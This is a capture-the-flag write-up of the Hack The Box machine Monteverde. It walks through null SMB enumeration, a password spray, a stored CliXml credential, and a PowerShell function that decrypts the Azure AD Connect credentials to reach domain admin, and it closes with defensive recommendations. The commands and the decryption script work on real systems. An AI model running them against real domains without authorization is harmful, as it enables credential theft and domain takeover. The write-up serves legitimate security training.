---
title: "Monteverde — Azure AD Sync Credential Extraction"
description: "Guest SMB null authentication and a stored CliXml credential lead to Azure AD Sync database decryption and a domain administrator password."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - azure-ad-sync
  - credential-theft
---

## Summary

Monteverde is a Medium Windows Active Directory domain controller machine where guest SMB null authentication enables user enumeration and password spray. A weak credential on a service account leads to SMB share enumeration revealing a PowerShell CliXml file containing stored credentials for a domain user. WinRM access as that user exposes Microsoft Azure AD Sync installed on the domain controller; querying the local ADSync database and decrypting stored credentials using the Azure AD Connect cryptography library recovers a domain administrator password, yielding full domain administrative access.

All target IPs, hostnames, and credentials in this writeup are placeholders unless otherwise noted. Commands reference the HTB lab environment only.

## Context and Objective

The engagement targets an Active Directory domain controller (`<TARGET_HOSTNAME>.<TARGET_DOMAIN>`) hosting DNS, Kerberos, LDAP, SMB, and WinRM services. The domain `<TARGET_DOMAIN>` contains standard user accounts and several service accounts. The objective is to achieve domain administrator access starting from an unauthenticated position.

## Approach and Evidence

### Port Scanning

A fast TCP scan identifies the target as an AD domain controller with DNS, Kerberos, LDAP, SMB, and WinRM services exposed:

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV
```

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
```

The domain is `<TARGET_DOMAIN>` and the hostname is `<TARGET_HOSTNAME>`.

### Guest SMB Null Authentication

The domain controller accepts null SMB authentication, confirming guest access is permitted:

```bash
nxc smb <TARGET_IP> -u 'a' -p '' --shares
```

```text
SMB  <TARGET_IP>  445  <TARGET_HOSTNAME>  [*] Windows 10 / Server 2019 Build 17763 (Null Auth:True)
```

### SMB User Enumeration via Null Session

Null authentication SMB enumeration reveals the full domain user list:

```bash
nxc smb <TARGET_DOMAIN> -u '' -p '' --users
```

```text
<GUEST_ACCOUNT>
<SYNC_SERVICE_PRINCIPAL>
<STANDARD_USER>
<SERVICE_ACCOUNT>
<SERVICE_ACCOUNT_2>
<SERVICE_ACCOUNT_3>
<SERVICE_ACCOUNT_4>
<STANDARD_USER_2>
<STANDARD_USER_3>
<STANDARD_USER_4>
```

The domain contains standard user accounts and several service accounts, plus an Azure AD Connect service principal.

### Password Spray

Usernames are tested as their own passwords:

```bash
nxc smb <TARGET_DOMAIN> -u user.txt -p user.txt
```

```text
SMB  <TARGET_IP>  445  <TARGET_HOSTNAME>  [+] <TARGET_DOMAIN>\<SERVICE_ACCOUNT>:<SERVICE_ACCOUNT_PASSWORD>
```

The service account uses its username as its password, demonstrating a weak credential policy.

### SMB Share Enumeration

Shares are enumerated with the compromised credentials:

```bash
nxc smb <TARGET_DOMAIN> -u '<SERVICE_ACCOUNT>' -p '<SERVICE_ACCOUNT_PASSWORD>' --shares
```

```text
ADMIN$       Remote Admin
azure_uploads   READ
C$             Default share
E$             Default share
IPC$           READ
NETLOGON       READ
SYSVOL         READ
users$         READ
```

The `azure_uploads` and `users$` shares are readable. The `users$` share contains a single file — an Azure XML credential file under a user directory.

### CliXml Credential Discovery

The file `<STANDARD_USER>/azure.xml` is a PowerShell CliXml serialized object containing a stored credential:

```powershell
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password"><MHOP_PASSWORD></S>
    </Props>
  </Obj>
</Objs>
```

The `<S N="Password">` element contains the plaintext password. This is a PowerShell CliXml export of an Azure AD credential object. Testing the credential against discovered users confirms it belongs to `<STANDARD_USER>`.

### WinRM Access as a Domain User

The credentials grant WinRM access:

```bash
nxc winrm <TARGET_DOMAIN> -u '<STANDARD_USER>' -p '<STANDARD_USER_PASSWORD>'
```

```text
WINRM  <TARGET_IP>  5985  <TARGET_HOSTNAME>  [+] <TARGET_DOMAIN>\<STANDARD_USER>:<STANDARD_USER_PASSWORD> (Pwn3d!)
```

An interactive WinRM session is established as `<TARGET_DOMAIN>\<STANDARD_USER>`, the first foothold on the domain controller.

### BloodHound and WinPEAS Enumeration

BloodHound collection maps the AD attack surface:

```bash
rusthound-ce --domain <TARGET_DOMAIN> -u <STANDARD_USER> -p '<STANDARD_USER_PASSWORD>' --zip -o <TARGET_DOMAIN>
```

WinPEAS enumerates local privilege escalation vectors. The output reveals Microsoft Azure AD Sync is installed on the domain controller at `c:\program files\microsoft azure ad sync`.

Azure AD Sync stores the on-premises domain administrator credentials with reversible encryption in a local SQL Server database, making this a high-value privilege escalation target.

### Azure AD Connect Credential Decryption

The ADSync database is queried to extract encryption metadata:

```bash
sqlcmd -S <TARGET_HOSTNAME> -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
```

The `ADC.ps1` PowerShell function reads the encrypted configuration from the `mms_management_agent` table and uses the Azure AD Connect cryptography library (`mcrypt.dll`) to decrypt it:

```powershell
Function Get-ADConnectPassword{
  $key_id = 1
  $instance_id = [GUID]"<INSTANCE_GUID>"
  $entropy = [GUID]"<ENTROPY_GUID>"
  $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=<TARGET_HOSTNAME>;Database=ADSync;Trusted_Connection=true"
  $client.Open()
  $cmd = $client.CreateCommand()
  $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
  $reader = $cmd.ExecuteReader()
  $reader.Read() | Out-Null
  $config = $reader.GetString(0)
  $crypted = $reader.GetString(1)
  $reader.Close()
  add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
  $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
  $km.LoadKeySet($entropy, $instance_id, $key_id)
  $key = $null
  $km.GetActiveCredentialKey([ref]$key)
  $key2 = $null
  $km.GetKey(1, [ref]$key2)
  $decrypted = $null
  $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
  $domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
  $username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
  $password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
  Write-Host ("Domain: " + $domain.Domain)
  Write-Host ("Username: " + $username.Username)
  Write-Host ("Password: " + $password.Password)
}
```

Executing the function reveals the domain administrator credentials:

```text
Domain: <TARGET_DOMAIN>
Username: <DOMAIN_ADMIN_ACCOUNT>
Password: <ADMIN_PASSWORD>
```

The decrypted output provides `<TARGET_DOMAIN>\<DOMAIN_ADMIN_ACCOUNT>` with full domain administrative access.

### Administrator Access via WinRM

The recovered administrator credentials establish a privileged WinRM session:

```bash
evil-winrm -i <TARGET_IP> -u <DOMAIN_ADMIN_ACCOUNT> -p '<DOMAIN_ADMIN_PASSWORD>'
```

Full administrative access is obtained as `<TARGET_DOMAIN>\<DOMAIN_ADMIN_ACCOUNT>` on the domain controller.

## Challenges and Decisions

No significant failed attempts or troubleshooting was documented in the source. The attack chain progressed linearly through each stage.

## Outcome

Starting from an unauthenticated position, the full attack chain demonstrates:

1. **Null SMB authentication** → anonymous user enumeration
2. **Password spray** → service account compromise
3. **SMB share enumeration** → PowerShell CliXml credential file for a domain user
4. **WinRM foothold** → interactive shell on the domain controller
5. **Azure AD Sync enumeration** → local SQL database with reversible domain admin credentials
6. **ADSync credential decryption** → domain administrator access

The chain exploits four distinct misconfigurations: null SMB access, weak password policy, credential persistence in SMB shares, and Azure AD Connect reversible encryption.

## Lessons and Recommendations

- **Disable null SMB sessions** on domain controllers to prevent anonymous information disclosure.
- **Enforce password complexity** requirements; prohibit username-derived passwords on service accounts.
- **Never store serialized credentials** on network shares; use managed service accounts or Azure Key Vault.
- **Restrict Azure AD Sync database access** and use group Managed Service Accounts (gMSA) for the sync service to avoid reversible credential storage.
- **Rotate stored credentials** in Azure AD Connect regularly to limit exposure window.

## References

- HTB machine: [Monteverde](https://app.hackthebox.com/machines/Monteverde) (ID 223, retired, Windows, Medium)
- Azure AD Connect credential extraction: `mcrypt.dll` decryption via local SQL Server `ADSync` database
